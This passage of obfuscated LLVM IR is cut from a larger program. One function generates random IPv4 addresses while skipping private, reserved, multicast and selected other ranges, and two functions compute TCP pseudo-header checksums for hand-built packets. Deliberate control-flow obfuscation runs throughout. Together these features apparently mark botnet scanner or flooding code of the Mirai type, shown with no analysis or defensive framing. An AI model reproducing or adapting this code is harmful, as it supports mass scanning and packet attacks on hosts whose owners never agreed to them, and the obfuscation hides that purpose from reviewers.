  %196 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 0
  %197 = load i8, i8* %196, align 1
  %198 = zext i8 %197 to i32
  %199 = icmp eq i32 %198, 198
  br i1 %199, label %200, label %210

; <label>:200:                                    ; preds = %195
  %201 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 1
  %202 = load i8, i8* %201, align 1
  %203 = zext i8 %202 to i32
  %204 = icmp eq i32 %203, 18
  br i1 %204, label %487, label %205

; <label>:205:                                    ; preds = %200
  %206 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 1
  %207 = load i8, i8* %206, align 1
  %208 = zext i8 %207 to i32
  %209 = icmp eq i32 %208, 19
  br i1 %209, label %487, label %210

; <label>:210:                                    ; preds = %205, %195
  %211 = load i32, i32* @x.71
  %212 = load i32, i32* @y.72
  %213 = sub i32 %211, 1
  %214 = mul i32 %211, %213
  %215 = urem i32 %214, 2
  %216 = icmp eq i32 %215, 0
  %217 = icmp slt i32 %212, 10
  %218 = or i1 %216, %217
  br i1 %218, label %originalBB45, label %originalBB45alteredBB

originalBB45:                                     ; preds = %originalBB45alteredBB, %210
  %219 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 0
  %220 = load i8, i8* %219, align 1
  %221 = zext i8 %220 to i32
  %222 = icmp eq i32 %221, 198
  %223 = load i32, i32* @x.71
  %224 = load i32, i32* @y.72
  %225 = sub i32 %223, 1
  %226 = mul i32 %223, %225
  %227 = urem i32 %226, 2
  %228 = icmp eq i32 %227, 0
  %229 = icmp slt i32 %224, 10
  %230 = or i1 %228, %229
  br i1 %230, label %originalBBpart247, label %originalBB45alteredBB

originalBBpart247:                                ; preds = %originalBB45
  br i1 %222, label %231, label %241

; <label>:231:                                    ; preds = %originalBBpart247
  %232 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 1
  %233 = load i8, i8* %232, align 1
  %234 = zext i8 %233 to i32
  %235 = icmp eq i32 %234, 51
  br i1 %235, label %236, label %241

; <label>:236:                                    ; preds = %231
  %237 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 2
  %238 = load i8, i8* %237, align 1
  %239 = zext i8 %238 to i32
  %240 = icmp eq i32 %239, 100
  br i1 %240, label %487, label %241

; <label>:241:                                    ; preds = %236, %231, %originalBBpart247
  %242 = load i32, i32* @x.71
  %243 = load i32, i32* @y.72
  %244 = sub i32 %242, 1
  %245 = mul i32 %242, %244
  %246 = urem i32 %245, 2
  %247 = icmp eq i32 %246, 0
  %248 = icmp slt i32 %243, 10
  %249 = or i1 %247, %248
  br i1 %249, label %originalBB49, label %originalBB49alteredBB

originalBB49:                                     ; preds = %originalBB49alteredBB, %241
  %250 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 0
  %251 = load i8, i8* %250, align 1
  %252 = zext i8 %251 to i32
  %253 = icmp eq i32 %252, 203
  %254 = load i32, i32* @x.71
  %255 = load i32, i32* @y.72
  %256 = sub i32 %254, 1
  %257 = mul i32 %254, %256
  %258 = urem i32 %257, 2
  %259 = icmp eq i32 %258, 0
  %260 = icmp slt i32 %255, 10
  %261 = or i1 %259, %260
  br i1 %261, label %originalBBpart251, label %originalBB49alteredBB

originalBBpart251:                                ; preds = %originalBB49
  br i1 %253, label %262, label %288

; <label>:262:                                    ; preds = %originalBBpart251
  %263 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 1
  %264 = load i8, i8* %263, align 1
  %265 = zext i8 %264 to i32
  %266 = icmp eq i32 %265, 0
  br i1 %266, label %267, label %288

; <label>:267:                                    ; preds = %262
  %268 = load i32, i32* @x.71
  %269 = load i32, i32* @y.72
  %270 = sub i32 %268, 1
  %271 = mul i32 %268, %270
  %272 = urem i32 %271, 2
  %273 = icmp eq i32 %272, 0
  %274 = icmp slt i32 %269, 10
  %275 = or i1 %273, %274
  br i1 %275, label %originalBB53, label %originalBB53alteredBB

originalBB53:                                     ; preds = %originalBB53alteredBB, %267
  %276 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 2
  %277 = load i8, i8* %276, align 1
  %278 = zext i8 %277 to i32
  %279 = icmp eq i32 %278, 113
  %280 = load i32, i32* @x.71
  %281 = load i32, i32* @y.72
  %282 = sub i32 %280, 1
  %283 = mul i32 %280, %282
  %284 = urem i32 %283, 2
  %285 = icmp eq i32 %284, 0
  %286 = icmp slt i32 %281, 10
  %287 = or i1 %285, %286
  br i1 %287, label %originalBBpart255, label %originalBB53alteredBB

originalBBpart255:                                ; preds = %originalBB53
  br i1 %279, label %487, label %288

; <label>:288:                                    ; preds = %originalBBpart255, %262, %originalBBpart251
  %289 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 0
  %290 = load i8, i8* %289, align 1
  %291 = zext i8 %290 to i32
  %292 = icmp eq i32 %291, 62
  br i1 %292, label %293, label %298

; <label>:293:                                    ; preds = %288
  %294 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 1
  %295 = load i8, i8* %294, align 1
  %296 = zext i8 %295 to i32
  %297 = icmp sle i32 %296, 30
  br i1 %297, label %487, label %298

; <label>:298:                                    ; preds = %293, %288
  %299 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 0
  %300 = load i8, i8* %299, align 1
  %301 = zext i8 %300 to i32
  %302 = icmp eq i32 %301, 207
  br i1 %302, label %303, label %329

; <label>:303:                                    ; preds = %298
  %304 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 1
  %305 = load i8, i8* %304, align 1
  %306 = zext i8 %305 to i32
  %307 = icmp sge i32 %306, 31
  br i1 %307, label %308, label %329

; <label>:308:                                    ; preds = %303
  %309 = load i32, i32* @x.71
  %310 = load i32, i32* @y.72
  %311 = sub i32 %309, 1
  %312 = mul i32 %309, %311
  %313 = urem i32 %312, 2
  %314 = icmp eq i32 %313, 0
  %315 = icmp slt i32 %310, 10
  %316 = or i1 %314, %315
  br i1 %316, label %originalBB57, label %originalBB57alteredBB

originalBB57:                                     ; preds = %originalBB57alteredBB, %308
  %317 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 2
  %318 = load i8, i8* %317, align 1
  %319 = zext i8 %318 to i32
  %320 = icmp sle i32 %319, 120
  %321 = load i32, i32* @x.71
  %322 = load i32, i32* @y.72
  %323 = sub i32 %321, 1
  %324 = mul i32 %321, %323
  %325 = urem i32 %324, 2
  %326 = icmp eq i32 %325, 0
  %327 = icmp slt i32 %322, 10
  %328 = or i1 %326, %327
  br i1 %328, label %originalBBpart259, label %originalBB57alteredBB

originalBBpart259:                                ; preds = %originalBB57
  br i1 %320, label %487, label %329

; <label>:329:                                    ; preds = %originalBBpart259, %303, %298
  %330 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 0
  %331 = load i8, i8* %330, align 1
  %332 = zext i8 %331 to i32
  %333 = icmp eq i32 %332, 65
  br i1 %333, label %334, label %360

; <label>:334:                                    ; preds = %329
  %335 = load i32, i32* @x.71
  %336 = load i32, i32* @y.72
  %337 = sub i32 %335, 1
  %338 = mul i32 %335, %337
  %339 = urem i32 %338, 2
  %340 = icmp eq i32 %339, 0
  %341 = icmp slt i32 %336, 10
  %342 = or i1 %340, %341
  br i1 %342, label %originalBB61, label %originalBB61alteredBB

originalBB61:                                     ; preds = %originalBB61alteredBB, %334
  %343 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 1
  %344 = load i8, i8* %343, align 1
  %345 = zext i8 %344 to i32
  %346 = icmp sge i32 %345, 224
  %347 = load i32, i32* @x.71
  %348 = load i32, i32* @y.72
  %349 = sub i32 %347, 1
  %350 = mul i32 %347, %349
  %351 = urem i32 %350, 2
  %352 = icmp eq i32 %351, 0
  %353 = icmp slt i32 %348, 10
  %354 = or i1 %352, %353
  br i1 %354, label %originalBBpart263, label %originalBB61alteredBB

originalBBpart263:                                ; preds = %originalBB61
  br i1 %346, label %355, label %360

; <label>:355:                                    ; preds = %originalBBpart263
  %356 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 2
  %357 = load i8, i8* %356, align 1
  %358 = zext i8 %357 to i32
  %359 = icmp sle i32 %358, 226
  br i1 %359, label %487, label %360

; <label>:360:                                    ; preds = %355, %originalBBpart263, %329
  %361 = load i32, i32* @x.71
  %362 = load i32, i32* @y.72
  %363 = sub i32 %361, 1
  %364 = mul i32 %361, %363
  %365 = urem i32 %364, 2
  %366 = icmp eq i32 %365, 0
  %367 = icmp slt i32 %362, 10
  %368 = or i1 %366, %367
  br i1 %368, label %originalBB65, label %originalBB65alteredBB

originalBB65:                                     ; preds = %originalBB65alteredBB, %360
  %369 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 0
  %370 = load i8, i8* %369, align 1
  %371 = zext i8 %370 to i32
  %372 = icmp eq i32 %371, 195
  %373 = load i32, i32* @x.71
  %374 = load i32, i32* @y.72
  %375 = sub i32 %373, 1
  %376 = mul i32 %373, %375
  %377 = urem i32 %376, 2
  %378 = icmp eq i32 %377, 0
  %379 = icmp slt i32 %374, 10
  %380 = or i1 %378, %379
  br i1 %380, label %originalBBpart267, label %originalBB65alteredBB

originalBBpart267:                                ; preds = %originalBB65
  br i1 %372, label %381, label %402

; <label>:381:                                    ; preds = %originalBBpart267
  %382 = load i32, i32* @x.71
  %383 = load i32, i32* @y.72
  %384 = sub i32 %382, 1
  %385 = mul i32 %382, %384
  %386 = urem i32 %385, 2
  %387 = icmp eq i32 %386, 0
  %388 = icmp slt i32 %383, 10
  %389 = or i1 %387, %388
  br i1 %389, label %originalBB69, label %originalBB69alteredBB

originalBB69:                                     ; preds = %originalBB69alteredBB, %381
  %390 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 1
  %391 = load i8, i8* %390, align 1
  %392 = zext i8 %391 to i32
  %393 = icmp eq i32 %392, 10
  %394 = load i32, i32* @x.71
  %395 = load i32, i32* @y.72
  %396 = sub i32 %394, 1
  %397 = mul i32 %394, %396
  %398 = urem i32 %397, 2
  %399 = icmp eq i32 %398, 0
  %400 = icmp slt i32 %395, 10
  %401 = or i1 %399, %400
  br i1 %401, label %originalBBpart271, label %originalBB69alteredBB

originalBBpart271:                                ; preds = %originalBB69
  br i1 %393, label %487, label %402

; <label>:402:                                    ; preds = %originalBBpart271, %originalBBpart267
  %403 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 0
  %404 = load i8, i8* %403, align 1
  %405 = zext i8 %404 to i32
  %406 = icmp eq i32 %405, 216
  br i1 %406, label %407, label %433

; <label>:407:                                    ; preds = %402
  %408 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 1
  %409 = load i8, i8* %408, align 1
  %410 = zext i8 %409 to i32
  %411 = icmp eq i32 %410, 25
  br i1 %411, label %487, label %412

; <label>:412:                                    ; preds = %407
  %413 = load i32, i32* @x.71
  %414 = load i32, i32* @y.72
  %415 = sub i32 %413, 1
  %416 = mul i32 %413, %415
  %417 = urem i32 %416, 2
  %418 = icmp eq i32 %417, 0
  %419 = icmp slt i32 %414, 10
  %420 = or i1 %418, %419
  br i1 %420, label %originalBB73, label %originalBB73alteredBB

originalBB73:                                     ; preds = %originalBB73alteredBB, %412
  %421 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 1
  %422 = load i8, i8* %421, align 1
  %423 = zext i8 %422 to i32
  %424 = icmp eq i32 %423, 94
  %425 = load i32, i32* @x.71
  %426 = load i32, i32* @y.72
  %427 = sub i32 %425, 1
  %428 = mul i32 %425, %427
  %429 = urem i32 %428, 2
  %430 = icmp eq i32 %429, 0
  %431 = icmp slt i32 %426, 10
  %432 = or i1 %430, %431
  br i1 %432, label %originalBBpart275, label %originalBB73alteredBB

originalBBpart275:                                ; preds = %originalBB73
  br i1 %424, label %487, label %433

; <label>:433:                                    ; preds = %originalBBpart275, %402
  %434 = load i32, i32* @x.71
  %435 = load i32, i32* @y.72
  %436 = sub i32 %434, 1
  %437 = mul i32 %434, %436
  %438 = urem i32 %437, 2
  %439 = icmp eq i32 %438, 0
  %440 = icmp slt i32 %435, 10
  %441 = or i1 %439, %440
  br i1 %441, label %originalBB77, label %originalBB77alteredBB

originalBB77:                                     ; preds = %originalBB77alteredBB, %433
  %442 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 0
  %443 = load i8, i8* %442, align 1
  %444 = zext i8 %443 to i32
  %445 = icmp eq i32 %444, 212
  %446 = load i32, i32* @x.71
  %447 = load i32, i32* @y.72
  %448 = sub i32 %446, 1
  %449 = mul i32 %446, %448
  %450 = urem i32 %449, 2
  %451 = icmp eq i32 %450, 0
  %452 = icmp slt i32 %447, 10
  %453 = or i1 %451, %452
  br i1 %453, label %originalBBpart279, label %originalBB77alteredBB

originalBBpart279:                                ; preds = %originalBB77
  br i1 %445, label %454, label %459

; <label>:454:                                    ; preds = %originalBBpart279
  %455 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 1
  %456 = load i8, i8* %455, align 1
  %457 = zext i8 %456 to i32
  %458 = icmp eq i32 %457, 56
  br i1 %458, label %487, label %459

; <label>:459:                                    ; preds = %454, %originalBBpart279
  %460 = load i32, i32* @x.71
  %461 = load i32, i32* @y.72
  %462 = sub i32 %460, 1
  %463 = mul i32 %460, %462
  %464 = urem i32 %463, 2
  %465 = icmp eq i32 %464, 0
  %466 = icmp slt i32 %461, 10
  %467 = or i1 %465, %466
  br i1 %467, label %originalBB81, label %originalBB81alteredBB

originalBB81:                                     ; preds = %originalBB81alteredBB, %459
  %468 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 0
  %469 = load i8, i8* %468, align 1
  %470 = zext i8 %469 to i32
  %471 = icmp sge i32 %470, 224
  %472 = load i32, i32* @x.71
  %473 = load i32, i32* @y.72
  %474 = sub i32 %472, 1
  %475 = mul i32 %472, %474
  %476 = urem i32 %475, 2
  %477 = icmp eq i32 %476, 0
  %478 = icmp slt i32 %473, 10
  %479 = or i1 %477, %478
  br i1 %479, label %originalBBpart283, label %originalBB81alteredBB

originalBBpart283:                                ; preds = %originalBB81
  br i1 %471, label %480, label %485

; <label>:480:                                    ; preds = %originalBBpart283
  %481 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 0
  %482 = load i8, i8* %481, align 1
  %483 = zext i8 %482 to i32
  %484 = icmp sle i32 %483, 239
  br label %485

; <label>:485:                                    ; preds = %480, %originalBBpart283
  %486 = phi i1 [ false, %originalBBpart283 ], [ %484, %480 ]
  br label %487

; <label>:487:                                    ; preds = %485, %454, %originalBBpart275, %407, %originalBBpart271, %355, %originalBBpart259, %293, %originalBBpart255, %236, %205, %200, %originalBBpart243, %148, %117, %102, %71, %61, %56, %41, %36
  %488 = phi i1 [ true, %454 ], [ true, %originalBBpart275 ], [ true, %407 ], [ true, %originalBBpart271 ], [ true, %355 ], [ true, %originalBBpart259 ], [ true, %293 ], [ true, %originalBBpart255 ], [ true, %236 ], [ true, %205 ], [ true, %200 ], [ true, %originalBBpart243 ], [ true, %148 ], [ true, %117 ], [ true, %102 ], [ true, %71 ], [ true, %61 ], [ true, %56 ], [ true, %41 ], [ true, %36 ], [ %486, %485 ]
  br i1 %488, label %489, label %506

; <label>:489:                                    ; preds = %487
  %490 = call i32 @rand() #2
  %491 = srem i32 %490, 255
  %492 = trunc i32 %491 to i8
  %493 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 0
  store i8 %492, i8* %493, align 1
  %494 = call i32 @rand() #2
  %495 = srem i32 %494, 255
  %496 = trunc i32 %495 to i8
  %497 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 1
  store i8 %496, i8* %497, align 1
  %498 = call i32 @rand() #2
  %499 = srem i32 %498, 255
  %500 = trunc i32 %499 to i8
  %501 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 2
  store i8 %500, i8* %501, align 1
  %502 = call i32 @rand() #2
  %503 = srem i32 %502, 255
  %504 = trunc i32 %503 to i8
  %505 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 3
  store i8 %504, i8* %505, align 1
  br label %36

; <label>:506:                                    ; preds = %487
  %507 = bitcast [16 x i8]* %10 to i8*
  call void @llvm.memset.p0i8.i64(i8* %507, i8 0, i64 16, i32 16, i1 false)
  %508 = getelementptr inbounds [16 x i8], [16 x i8]* %10, i32 0, i32 0
  %509 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 0
  %510 = load i8, i8* %509, align 1
  %511 = zext i8 %510 to i32
  %512 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 1
  %513 = load i8, i8* %512, align 1
  %514 = zext i8 %513 to i32
  %515 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 2
  %516 = load i8, i8* %515, align 1
  %517 = zext i8 %516 to i32
  %518 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 3
  %519 = load i8, i8* %518, align 1
  %520 = zext i8 %519 to i32
  %521 = call i32 (i8*, i8*, ...) @sprintf(i8* %508, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.311, i32 0, i32 0), i32 %511, i32 %514, i32 %517, i32 %520) #2
  %522 = getelementptr inbounds [16 x i8], [16 x i8]* %10, i32 0, i32 0
  %523 = call i32 @inet_addr(i8* %522) #2
  ret i32 %523

originalBBalteredBB:                              ; preds = %originalBB, %0
  %524 = alloca [4 x i8], align 1
  %525 = alloca [16 x i8], align 16
  %526 = bitcast [4 x i8]* %524 to i8*
  call void @llvm.memset.p0i8.i64(i8* %526, i8 0, i64 4, i32 1, i1 false)
  %527 = call i32 @rand() #2
  %_ = sub i32 %527, 255
  %gen = mul i32 %_, 255
  %_1 = shl i32 %527, 255
  %528 = srem i32 %527, 255
  %529 = trunc i32 %528 to i8
  %530 = getelementptr inbounds [4 x i8], [4 x i8]* %524, i64 0, i64 0
  store i8 %529, i8* %530, align 1
  %531 = call i32 @rand() #2
  %_2 = shl i32 %531, 255
  %_3 = shl i32 %531, 255
  %_4 = shl i32 %531, 255
  %_5 = shl i32 %531, 255
  %_6 = sub i32 %531, 255
  %gen7 = mul i32 %_6, 255
  %_8 = sub i32 %531, 255
  %gen9 = mul i32 %_8, 255
  %_10 = sub i32 %531, 255
  %gen11 = mul i32 %_10, 255
  %532 = srem i32 %531, 255
  %533 = trunc i32 %532 to i8
  %534 = getelementptr inbounds [4 x i8], [4 x i8]* %524, i64 0, i64 1
  store i8 %533, i8* %534, align 1
  %535 = call i32 @rand() #2
  %_12 = shl i32 %535, 255
  %_13 = sub i32 %535, 255
  %gen14 = mul i32 %_13, 255
  %_15 = sub i32 0, %535
  %gen16 = add i32 %_15, 255
  %_17 = sub i32 0, %535
  %gen18 = add i32 %_17, 255
  %_19 = shl i32 %535, 255
  %536 = srem i32 %535, 255
  %537 = trunc i32 %536 to i8
  %538 = getelementptr inbounds [4 x i8], [4 x i8]* %524, i64 0, i64 2
  store i8 %537, i8* %538, align 1
  %539 = call i32 @rand() #2
  %_20 = sub i32 0, %539
  %gen21 = add i32 %_20, 255
  %_22 = shl i32 %539, 255
  %_23 = sub i32 0, %539
  %gen24 = add i32 %_23, 255
  %_25 = shl i32 %539, 255
  %_26 = shl i32 %539, 255
  %_27 = shl i32 %539, 255
  %_28 = shl i32 %539, 255
  %540 = srem i32 %539, 255
  %541 = trunc i32 %540 to i8
  %542 = getelementptr inbounds [4 x i8], [4 x i8]* %524, i64 0, i64 3
  store i8 %541, i8* %542, align 1
  br label %originalBB

originalBB29alteredBB:                            ; preds = %originalBB29, %81
  %543 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 1
  %544 = load i8, i8* %543, align 1
  %545 = zext i8 %544 to i32
  %546 = icmp sle i32 %545, 16
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %122
  %547 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 0
  %548 = load i8, i8* %547, align 1
  %549 = zext i8 %548 to i32
  %550 = icmp eq i32 %549, 192
  br label %originalBB33

originalBB37alteredBB:                            ; preds = %originalBB37, %153
  %551 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 0
  %552 = load i8, i8* %551, align 1
  %553 = zext i8 %552 to i32
  %554 = icmp eq i32 %553, 192
  br label %originalBB37

originalBB41alteredBB:                            ; preds = %originalBB41, %174
  %555 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 1
  %556 = load i8, i8* %555, align 1
  %557 = zext i8 %556 to i32
  %558 = icmp eq i32 %557, 168
  br label %originalBB41

originalBB45alteredBB:                            ; preds = %originalBB45, %210
  %559 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 0
  %560 = load i8, i8* %559, align 1
  %561 = zext i8 %560 to i32
  %562 = icmp eq i32 %561, 198
  br label %originalBB45

originalBB49alteredBB:                            ; preds = %originalBB49, %241
  %563 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 0
  %564 = load i8, i8* %563, align 1
  %565 = zext i8 %564 to i32
  %566 = icmp eq i32 %565, 203
  br label %originalBB49

originalBB53alteredBB:                            ; preds = %originalBB53, %267
  %567 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 2
  %568 = load i8, i8* %567, align 1
  %569 = zext i8 %568 to i32
  %570 = icmp eq i32 %569, 113
  br label %originalBB53

originalBB57alteredBB:                            ; preds = %originalBB57, %308
  %571 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 2
  %572 = load i8, i8* %571, align 1
  %573 = zext i8 %572 to i32
  %574 = icmp sle i32 %573, 120
  br label %originalBB57

originalBB61alteredBB:                            ; preds = %originalBB61, %334
  %575 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 1
  %576 = load i8, i8* %575, align 1
  %577 = zext i8 %576 to i32
  %578 = icmp sge i32 %577, 224
  br label %originalBB61

originalBB65alteredBB:                            ; preds = %originalBB65, %360
  %579 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 0
  %580 = load i8, i8* %579, align 1
  %581 = zext i8 %580 to i32
  %582 = icmp eq i32 %581, 195
  br label %originalBB65

originalBB69alteredBB:                            ; preds = %originalBB69, %381
  %583 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 1
  %584 = load i8, i8* %583, align 1
  %585 = zext i8 %584 to i32
  %586 = icmp eq i32 %585, 10
  br label %originalBB69

originalBB73alteredBB:                            ; preds = %originalBB73, %412
  %587 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 1
  %588 = load i8, i8* %587, align 1
  %589 = zext i8 %588 to i32
  %590 = icmp eq i32 %589, 94
  br label %originalBB73

originalBB77alteredBB:                            ; preds = %originalBB77, %433
  %591 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 0
  %592 = load i8, i8* %591, align 1
  %593 = zext i8 %592 to i32
  %594 = icmp eq i32 %593, 212
  br label %originalBB77

originalBB81alteredBB:                            ; preds = %originalBB81, %459
  %595 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 0
  %596 = load i8, i8* %595, align 1
  %597 = zext i8 %596 to i32
  %598 = icmp sge i32 %597, 224
  br label %originalBB81
}

; Function Attrs: nounwind
declare i32 @rand() #4

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #4

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  br label %6

; <label>:6:                                      ; preds = %9, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %18

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i32
  %14 = load i32, i32* %5, align 4
  %15 = add nsw i32 %14, %13
  store i32 %15, i32* %5, align 4
  %16 = load i32, i32* %4, align 4
  %17 = sub nsw i32 %16, 2
  store i32 %17, i32* %4, align 4
  br label %6

; <label>:18:                                     ; preds = %6
  %19 = load i32, i32* %4, align 4
  %20 = icmp sgt i32 %19, 0
  br i1 %20, label %21, label %28

; <label>:21:                                     ; preds = %18
  %22 = load i16*, i16** %3, align 8
  %23 = bitcast i16* %22 to i8*
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i32
  %26 = load i32, i32* %5, align 4
  %27 = add nsw i32 %26, %25
  store i32 %27, i32* %5, align 4
  br label %28

; <label>:28:                                     ; preds = %21, %18
  %29 = load i32, i32* @x.73
  %30 = load i32, i32* @y.74
  %31 = sub i32 %29, 1
  %32 = mul i32 %29, %31
  %33 = urem i32 %32, 2
  %34 = icmp eq i32 %33, 0
  %35 = icmp slt i32 %30, 10
  %36 = or i1 %34, %35
  br i1 %36, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %28
  %37 = load i32, i32* @x.73
  %38 = load i32, i32* @y.74
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %45

; <label>:45:                                     ; preds = %49, %originalBBpart2
  %46 = load i32, i32* %5, align 4
  %47 = ashr i32 %46, 16
  %48 = icmp ne i32 %47, 0
  br i1 %48, label %49, label %55

; <label>:49:                                     ; preds = %45
  %50 = load i32, i32* %5, align 4
  %51 = and i32 %50, 65535
  %52 = load i32, i32* %5, align 4
  %53 = ashr i32 %52, 16
  %54 = add nsw i32 %51, %53
  store i32 %54, i32* %5, align 4
  br label %45

; <label>:55:                                     ; preds = %45
  %56 = load i32, i32* %5, align 4
  %57 = xor i32 %56, -1
  %58 = trunc i32 %57 to i16
  ret i16 %58

originalBBalteredBB:                              ; preds = %originalBB, %28
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #13
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #2
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #2
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: noinline nounwind uwtable
